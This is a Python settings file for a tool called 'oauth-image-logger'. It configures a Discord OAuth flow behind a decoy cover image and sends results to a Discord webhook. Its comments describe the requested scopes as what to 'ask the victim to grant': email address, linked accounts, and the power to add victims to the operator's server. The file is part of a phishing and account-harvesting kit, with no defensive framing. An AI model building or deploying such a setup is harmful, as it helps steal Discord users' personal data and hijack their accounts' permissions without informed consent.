# language: Python, file: oauth-image-logger/config/settings.py
# edit these four, nothing else

CLIENT_ID    = "YOUR_DISCORD_APP_ID"
REDIRECT_URI = "https://your.site/cb"
COVER_URL    = "https://i.imgur.com/yourcover.jpg"
WEBHOOK      = "https://discord.com/api/webhooks/REPLACE/REPLACE"

# what you ask the victim to grant
# identify        -> username, id, avatar
# email           -> email address
# guilds.join     -> add them to a server you own (needs bot + scope enabled in portal)
# connections     -> linked accounts (steam/github/spotify/etc)
SCOPES = "identify email guilds.join connections"

# server
HOST = "0.0.0.0"
PORT = 5002

# how long the cover image shows before the OAuth redirect (ms)
COVER_DELAY_MS = 2000